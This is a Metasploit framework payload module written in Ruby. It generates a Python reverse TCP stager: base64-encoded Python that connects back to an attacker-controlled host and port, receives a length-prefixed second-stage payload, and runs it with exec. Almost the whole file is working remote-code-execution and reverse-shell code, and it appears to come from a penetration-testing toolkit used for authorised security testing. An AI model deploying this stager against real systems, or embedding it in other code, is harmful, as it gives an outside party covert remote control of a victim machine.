##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Python Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => 'Spencer McIntyre',
      'License'       => MSF_LICENSE,
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        => {'Payload' => ""}
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    # Set up the socket
    cmd  = "import socket,struct\n"
    cmd << "s=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
    cmd << "s.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
    cmd << "l=struct.unpack('>I',s.recv(4))[0]\n"
    cmd << "d=s.recv(4096)\n"
    cmd << "while len(d)!=l:\n"
    cmd << "\td+=s.recv(4096)\n"
    cmd << "exec(d,{'s':s})\n"

    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
    b64_stub  = "import base64,sys;exec(base64.b64decode("
    b64_stub << "{2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('"
    b64_stub << Rex::Text.encode_base64(cmd)
    b64_stub << "')))"
    return b64_stub
  end

  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end
end
